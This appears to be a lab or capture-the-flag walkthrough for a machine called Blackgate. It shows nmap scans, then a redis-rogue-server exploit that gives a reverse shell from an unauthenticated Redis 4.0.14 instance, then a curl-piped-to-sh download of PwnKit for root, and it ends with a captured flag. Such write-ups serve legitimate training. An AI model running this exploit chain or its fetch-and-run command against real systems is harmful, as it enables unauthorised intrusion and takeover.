# 🐧 Blackgate

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.176

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 6379

```shell
# Enumerating
nmap --script redis-info -sV -p 6379 192.168.182.176

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.14 (64 bits)
| redis-info:
|   Version: 4.0.14
|   Operating System: Linux 5.8.0-63-generic x86_64
|   Architecture: 64 bits
|   Process ID: 874
|   Role: master
```

## Initial Access

We found an exploit for receiving a reverse shell from an unauthenticated Redis instance.

```shell
# Git
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server/RedisModulesSDK/exp/
make

# Listener
rlwrap -cAra nc -vnlp 443

# Exploiting
./redis-rogue-server.py --rhost 192.168.182.176 --lhost 192.168.45.185

# TTY Upgrade
/usr/bin/python3 -c "import pty;pty.spawn('/bin/bash')"

# Evidence
cat local.txt
```

## Privilege Escalation

After enumerating the entire machine and not finding any privilege escalation vectors, we used Pwnkit to achieve this goal.

```shell
# Privilege Escalation
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

## Post-Exploitation

With privileged access to the machine, we took the proof.txt flag as evidence of our exploit.

```shell
# Evidence
ip a
cat /root/proof.txt
41f85022a062c01ff93dc7efddc029a7
```
